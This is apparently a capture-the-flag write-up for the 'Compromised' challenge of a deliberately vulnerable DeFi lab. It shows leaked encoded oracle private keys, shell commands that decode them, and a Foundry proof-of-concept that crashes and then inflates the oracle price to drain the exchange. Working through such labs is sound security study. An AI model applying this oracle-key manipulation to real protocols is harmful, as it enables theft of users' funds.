# Compromised

### 1. bug  = manipulate the oracle data(data source)

### 2. where = src/compromised/TrustfulOracle.sol &TrustfulOracleInitializer.sol

### 3. leaks reason =
- 1.leaked oralce data private key:
 address 1 :
 4d 48 67 33 5a 44 45 31 59 6d 4a 68 4d 6a 5a 6a 4e 54 49 7a 4e 6a 67 7a 59 6d 5a 6a 4d 32 52 6a 4e 32 4e 6b 59 7a 56 6b 4d 57 49 34 59 54 49 33 4e 44 51 30 4e 44 63 31 4f 54 64 6a 5a 6a 52 6b 59 54 45 33 4d 44 56 6a 5a 6a 5a 6a 4f 54 6b 7a 4d 44 59 7a 4e 7a 51 30

 Address 2: 
4d 48 67 32 4f 47 4a 6b 4d 44 49 77 59 57 51 78 4f 44 5a 69 4e 6a 51 33 59 54 59 35 4d 57 4d 32 59 54 56 6a 4d 47 4d 78 4e 54 49 35 5a 6a 49 78 5a 57 4e 6b 4d 44 6c 6b 59 32 4d 30 4e 54 49 30 4d 54 51 77 4d 6d 46 6a 4e 6a 42 69 59 54 4d 33 4e 32 4d 30 4d 54 55 35

- both of random number is leaked privte key that can be decode and will resulting 2 diffrent address

- 2. this exchange using median concept(if there 3 man in room ,2 man agree , 1man not than 2is won)

- 3. 
after we get the address(as we said before it was a oracle priv key),this causing data manipulating as what were abt to do

decode :
```
! echo "<hex bytes>" | xxd -r -p | base64 -d
- xxd -r -p → turns hex into text (a Base64 string)
- base64 -d → decodes that → the 0x… private key

Then key → address:
! cast wallet address <0x…private key>

So the full path: hex → (xxd) Base64 → (base64 -d) private key → (cast) address.
```

### 4. how we breach (poc):
```
    function test_compromised() public checkSolved {
        // turns key into address
        //wear a mask for the maniuplate the price
        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);   
        oracle.postPrice("DVNFT", 0 wei);
        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);   
        oracle.postPrice("DVNFT", 0 wei);

        /// prank as player to buy the token
        vm.prank(player);
        uint256 id = exchange.buyOne{value:1}();

        /// sell with high price 
        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);   
        oracle.postPrice("DVNFT", 999 ether);
        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);   
        oracle.postPrice("DVNFT", 999 ether);

        vm.startPrank(player);
        nft.approve(address(exchange), id);
        exchange.sellOne(id);
        vm.stopPrank();       

        /// reset to init price
        vm.prank(0x188Ea627E3531Db590e6f1D71ED83628d1933088);   
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(0xA417D473c40a4d42BAd35f147c21eEa7973539D8);   
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(player);
        (bool ok, ) = recovery.call{value: 999 ether}("");
        require(ok, "transfer failed");
    }

```

